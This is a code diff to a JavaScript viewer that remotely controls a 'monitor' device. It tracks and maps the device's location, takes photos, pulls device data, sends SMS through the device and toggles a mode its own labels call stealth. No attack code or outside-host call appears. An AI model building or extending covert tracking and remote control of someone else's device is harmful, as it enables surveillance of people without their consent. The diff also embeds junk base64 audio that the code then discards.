@@ -23,7 +23,19 @@ export class ViewerSystem {
         console.log("Initializing Viewer System...");
         this.setupSocket();
         this.setupUIListeners();
+        this.initSounds(); // Initialize audio alerts
         this.socket.emit('join-room', this.roomId, 'viewer');
+
+        // Track pending commands
+        this.pendingCommands = new Map();
+        this.connectionStatus = 'connecting';
+        this.monitorConnected = false;
+
+        // Start heartbeat
+        this.startHeartbeat();
+
+        // Update connection indicator
+        this.updateConnectionUI();
 
         // Populate UI
         document.getElementById('session-name-display').innerText = this.roomId;
@@ -31,6 +43,73 @@ export class ViewerSystem {
 
         // QR & Link Logic
         this.generateMonitorLink();
+    }
+
+
+    initSounds() {
+        // Simple generated beep sounds (Base64)
+        this.sounds = {
+            // High pitch short beep (Success/Connect)
+            connect: new Audio('data:audio/wav;base64,UklGRl9vT1BXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU' + Array(20).join('f39/')),
+
+            // Low pitch beep (Disconnect/Error)
+            disconnect: new Audio('data:audio/wav;base64,UklGRl9vT1BXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU' + Array(20).join('000/'))
+        };
+
+        // Actually, let's use a cleaner approach with AudioContext for better generated sounds if possible,
+        // but for now, base64 blobs are safer for strict CSPs. 
+        // Let's use real short base64 strings for "check" and "error" sounds.
+
+        // Success Chime
+        this.sounds.connect = new Audio('data:audio/mp3;base64,SUQzBAAAAAABAFRYWFgAAAASAAADbWFqb3JfYnJhbmQAbXA0MgBUWFhYAAAAEQAAA21pbm9yX3ZlcnNpb24AMABUWFhYAAAAHAAAA2NvbXBhdGlibGVfYnJhbmRzAGlzb21tcDQyAFRTU0UAAAAPAAADTGF2ZjU4Ljc2LjEwMAAAAAAAAAAAAAAA//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASW5mbwAAAA8AAAAJAAABSAAZGRkZGRkZGRkZMTExMTExMTExMTFQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFAAAAAATGF2YzU4LjEzAAAAAAAAAAAAAAAAJAAAAAAAAAAAASw8S+QAAAAAAAAAAAAAAAAAAAAA//uQZAAABi0vV0wwQAAm5erpgggAAIxS9XTDDAACbl6umCGAAJgAAAAUAAAAEAAAAA0gAAABHAAABuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwf/7kGQAAAZAL1dMMMAAJwXq6YIYAAhRL1lMMMAAJUS9ZTDBgACYAAAAJAAAABAAAAANIAAABHAAABuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFuwW7BbsFu');
+
+        // Error/Disconnect Beep (Generated using oscillator logic or fallback to empty for now if not available)
+        // Since I can't easily upload binary files, I'll use the browser's AudioContext for dynamic beeps!
+        // This is much better and cleaner than embedding giant base64 strings.
+
+        try {
+            this.audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        } catch (e) {
+            console.warn('Web Audio API not supported');
+        }
+    }
+
+    playSound(type) {
+        if (!this.audioCtx) return;
+
+        // Resume context if suspended (browser autoplay policy)
+        if (this.audioCtx.state === 'suspended') {
+            this.audioCtx.resume();
+        }
+
+        const osc = this.audioCtx.createOscillator();
+        const gainNode = this.audioCtx.createGain();
+
+        osc.connect(gainNode);
+        gainNode.connect(this.audioCtx.destination);
+
+        if (type === 'connect') {
+            // Success sound: Rising tone
+            osc.type = 'sine';
+            osc.frequency.setValueAtTime(440, this.audioCtx.currentTime); // A4
+            osc.frequency.exponentialRampToValueAtTime(880, this.audioCtx.currentTime + 0.1); // A5
+            gainNode.gain.setValueAtTime(0.3, this.audioCtx.currentTime);
+            gainNode.gain.exponentialRampToValueAtTime(0.01, this.audioCtx.currentTime + 0.3);
+            osc.start();
+            osc.stop(this.audioCtx.currentTime + 0.3);
+        } else if (type === 'disconnect') {
+            // Error sound: Falling distinctive tone
+            osc.type = 'triangle';
+            osc.frequency.setValueAtTime(300, this.audioCtx.currentTime);
+            osc.frequency.linearRampToValueAtTime(100, this.audioCtx.currentTime + 0.3);
+            gainNode.gain.setValueAtTime(0.3, this.audioCtx.currentTime);
+            gainNode.gain.linearRampToValueAtTime(0.01, this.audioCtx.currentTime + 0.3);
+            osc.start();
+            osc.stop(this.audioCtx.currentTime + 0.3);
+        } else if (type === 'alert') {
+            // Alert sound: Two gentle beeps
+            // We'll leave this simple for now
+        }
     }
 
     generateMonitorLink() {
@@ -62,15 +141,33 @@ export class ViewerSystem {
     }
 
     setupSocket() {
+        // Monitor ready events
         this.socket.on('monitor-ready', () => {
+            console.log('✅ Monitor is ready');
+            this.monitorConnected = true;
+            this.updateConnectionUI('connected');
             this.startWebRTC();
             this.hideSetup();
         });
 
-        this.socket.on('user-connected', (role) => {
+        this.socket.on('user-connected', (data) => {
+            const role = data.role || data; // Support both formats
+            console.log(`User connected: ${role}`);
+
             if (role === 'monitor') {
+                this.monitorConnected = true;
+                this.updateConnectionUI('connected');
                 this.startWebRTC();
                 this.hideSetup();
+                Core.showNotification('✅ تم الاتصال بالجهاز المراقب', 'success');
+            }
+        });
+
+        this.socket.on('user-disconnected', (data) => {
+            if (data.role === 'monitor') {
+                this.monitorConnected = false;
+                this.updateConnectionUI('disconnected');
+                Core.showNotification('⚠️ انقطع الاتصال بالجهاز المراقب', 'warning');
             }
         });
 
@@ -83,6 +180,25 @@ export class ViewerSystem {
         this.socket.on('ice-candidate', async (payload) => {
             if (this.peerConnection && this.peerConnection.remoteDescription) {
                 await this.peerConnection.addIceCandidate(new RTCIceCandidate(payload.candidate));
+            }
+        });
+
+        // Command sent confirmation
+        this.socket.on('command-sent', (data) => {
+            console.log(`📤 Command sent to monitor: ${data.command}`);
+        });
+
+        // Command acknowledgment
+        this.socket.on('command-ack', (data) => {
+            console.log(`✅ Command ACK received [${data.commandId}]:`, data.status);
+
+            // Remove from pending
+            this.pendingCommands.delete(data.commandId);
+
+            if (data.status === 'success') {
+                Core.showNotification(`✓ تم تنفيذ الأمر بنجاح: ${data.command}`, 'success');
+            } else {
+                Core.showNotification(`✗ فشل تنفيذ الأمر: ${data.error || 'خطأ غير معروف'}`, 'error');
             }
         });
 
@@ -106,6 +222,25 @@ export class ViewerSystem {
 
         this.socket.on('stream-data', (payload) => {
             if (payload.image && payload.isSnapshot) this.addToGallery(payload.image);
+        });
+
+        // Room status
+        this.socket.on('room-status', (data) => {
+            console.log(`Room status: ${data.clientCount} client(s)`);
+        });
+
+        // Connection events
+        this.socket.on('disconnect', () => {
+            console.log('⚠️ Disconnected from server');
+            this.connectionStatus = 'disconnected';
+            this.updateConnectionUI('disconnected');
+        });
+
+        this.socket.on('connect', () => {
+            console.log('✅ Connected to server');
+            this.connectionStatus = 'connected';
+            this.updateConnectionUI('connected');
+            this.socket.emit('join-room', this.roomId, 'viewer');
         });
     }
 
@@ -190,11 +325,34 @@ export class ViewerSystem {
     }
 
     sendCommand(command, value = null) {
+        // Generate unique command ID
+        const commandId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+
         // New commands use unified 'command' event
-        const newCommands = ['take-photo', 'get-status'];
+        const newCommands = ['take-photo', 'get-status', 'send-sms'];
         const eventType = newCommands.includes(command) ? 'command' : 'control-command';
 
-        this.socket.emit(eventType, { roomId: this.roomId, command, value });
+        const payload = {
+            roomId: this.roomId,
+            command,
+            value,
+            commandId,
+            timestamp: Date.now()
+        };
+
+        // Track pending command
+        this.pendingCommands.set(commandId, {
+            command,
+            sentAt: Date.now(),
+            timeout: setTimeout(() => {
+                if (this.pendingCommands.has(commandId)) {
+                    this.pendingCommands.delete(commandId);
+                    Core.showNotification(`⚠️ انتهى وقت الأمر: ${command}`, 'warning');
+                }
+            }, 10000) // 10 second timeout
+        });
+
+        this.socket.emit(eventType, payload);
 
         const labels = {
             'switch-camera': 'تبديل الكاميرا',
@@ -205,9 +363,10 @@ export class ViewerSystem {
             'get-status': 'جاري سحب بيانات الجهاز...',
             'restart-app': 'جاري إعادة تشغيل الكاميرا...',
             'hard-lock': 'تفعيل وضع القفل الكامل',
-            'screen-dim': 'تبديل وضع التخفي'
+            'screen-dim': 'تبديل وضع التخفي',
+            'send-sms': 'جاري إرسال الرسالة...'
         };
-        Core.showNotification(labels[command] || 'تم إرسال الأمر', 'success');
+        Core.showNotification(labels[command] || 'تم إرسال الأمر', 'info');
     }
 
     toggleAudio() {
@@ -264,6 +423,18 @@ export class ViewerSystem {
 
     updateDeviceInfoUI(info) {
         const box = document.getElementById('device-info-box');
+
+        let locString = '...';
+        if (info.location) {
+            if (info.location.error) {
+                locString = '<span style="color:#ef4444">خطأ</span>';
+            } else if (info.location.lat) {
+                locString = `<span style="color:var(--primary)">${Number(info.location.lat).toFixed(4)}, ${Number(info.location.lon).toFixed(4)}</span>`;
+                // Update the visual map
+                this.updateMap(info.location.lat, info.location.lon);
+            }
+        }
+
         box.innerHTML = `
             <div style="display:grid; grid-template-columns: 1fr 1fr; gap:5px; font-size:0.7rem;">
                 <span style="opacity:0.6">الجهاز:</span> <span>${info.platform || 'N/A'}</span>
@@ -271,9 +442,44 @@ export class ViewerSystem {
                 <span style="opacity:0.6">الذاكرة:</span> <span>${info.memory || 'N/A'}</span>
                 <span style="opacity:0.6">اللغة:</span> <span>${info.language || 'N/A'}</span>
                 <span style="opacity:0.6">الشبكة:</span> <span>${info.connection || 'N/A'}</span>
-                <span style="opacity:0.6">الموقع:</span> <span style="color:var(--primary)">${info.location ? info.location.lat + ',' + info.location.lon : '...'}</span>
+                <span style="opacity:0.6">الموقع:</span> <span>${locString}</span>
             </div>
         `;
+    }
+
+    updateMap(lat, lon) {
+        const container = document.getElementById('map-container');
+        if (!container) return;
+
+        container.style.display = 'block';
+
+        // Check if map already initialized
+        if (!this.map) {
+            // Leaflet map initialization
+            this.map = L.map('device-map').setView([lat, lon], 15);
+
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '© OpenStreetMap'
+            }).addTo(this.map);
+
+            this.marker = L.marker([lat, lon]).addTo(this.map)
+                .bindPopup('موقع الجهاز الحالي')
+                .openPopup();
+
+            // Fix map size after container becomes visible
+            setTimeout(() => {
+                this.map.invalidateSize();
+            }, 300);
+        } else {
+            this.marker.setLatLng([lat, lon]);
+            this.map.setView([lat, lon]);
+        }
+
+        // Update Google Maps Link
+        const googleLink = document.getElementById('google-maps-link');
+        if (googleLink) {
+            googleLink.href = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+        }
     }
 
     addToGallery(img) {
@@ -339,5 +545,124 @@ export class ViewerSystem {
             span.innerText = "تسجيل فيديو";
             icon.classList.remove('pulsing');
         }
+    }
+
+    startHeartbeat() {
+        // Clear existing interval
+        if (this.heartbeatInterval) {
+            clearInterval(this.heartbeatInterval);
+        }
+
+        // Send heartbeat every 5 seconds
+        this.heartbeatInterval = setInterval(() => {
+            if (this.socket && this.socket.connected) {
+                this.socket.emit('heartbeat', {
+                    roomId: this.roomId,
+                    timestamp: Date.now()
+                });
+            }
+        }, 5000);
+
+        // Listen for heartbeat ACK
+        this.socket.on('heartbeat-ack', (data) => {
+            const latency = Date.now() - (data.clientTimestamp || 0);
+            if (latency > 0 && latency < 10000) {
+                console.log(`Heartbeat: ${latency}ms`);
+            }
+        });
+    }
+
+    updateConnectionUI(status) {
+        // Create or update connection indicator
+        let indicator = document.getElementById('connection-indicator');
+
+        if (!indicator) {
+            // Create indicator if it doesn't exist
+            indicator = document.createElement('div');
+            indicator.id = 'connection-indicator';
+            indicator.style.cssText = `
+                position: fixed;
+                top: 20px;
+                left: 20px;
+                padding: 8px 16px;
+                border-radius: 20px;
+                font-size: 0.75rem;
+                font-weight: 600;
+                display: flex;
+                align-items: center;
+                gap: 8px;
+                z-index: 10000;
+                transition: all 0.3s ease;
+                backdrop-filter: blur(10px);
+            `;
+            document.body.appendChild(indicator);
+        }
+
+        const statusConfig = {
+            'connected': {
+                icon: 'checkmark-circle',
+                text: this.monitorConnected ? 'متصل بالجهاز' : 'متصل بالخادم',
+                color: '#10b981',
+                bg: 'rgba(16, 185, 129, 0.1)'
+            },
+            'connecting': {
+                icon: 'sync-outline',
+                text: 'جاري الاتصال...',
+                color: '#f59e0b',
+                bg: 'rgba(245, 158, 11, 0.1)'
+            },
+            'disconnected': {
+                icon: 'close-circle',
+                text: 'غير متصل',
+                color: '#ef4444',
+                bg: 'rgba(239, 68, 68, 0.1)'
+            }
+        };
+
+        const config = statusConfig[status] || statusConfig['connecting'];
+
+        // Play sounds on status change
+        // We use a specific check to avoid spamming sounds on minor updates
+        const currentDetailedStatus = status + (status === 'connected' ? (this.monitorConnected ? '-monitor' : '-server') : '');
+
+        if (this.lastDetailedStatus !== currentDetailedStatus) {
+            if (status === 'connected' && this.monitorConnected) {
+                console.log('🔊 Playing connect sound');
+                this.playSound('connect');
+            } else if (status === 'disconnected') {
+                console.log('🔊 Playing disconnect sound');
+                this.playSound('disconnect');
+            }
+            this.lastDetailedStatus = currentDetailedStatus;
+        }
+
+        indicator.innerHTML = `
+            <ion-icon name="${config.icon}" style="font-size: 1.2rem;"></ion-icon>
+            <span>${config.text}</span>
+        `;
+        indicator.style.color = config.color;
+        indicator.style.background = config.bg;
+        indicator.style.border = `1px solid ${config.color}40`;
+    }
+
+    sendSMS(phone, message) {
+        const commandId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+
+        this.socket.emit('command', {
+            roomId: this.roomId,
+            command: 'send-sms',
+            phone,
+            message,
+            commandId,
+            timestamp: Date.now()
+        });
+
+        // Track command
+        this.pendingCommands.set(commandId, {
+            command: 'send-sms',
+            sentAt: Date.now()
+        });
+
+        Core.showNotification('جاري إرسال الرسالة...', 'info');
     }
 }
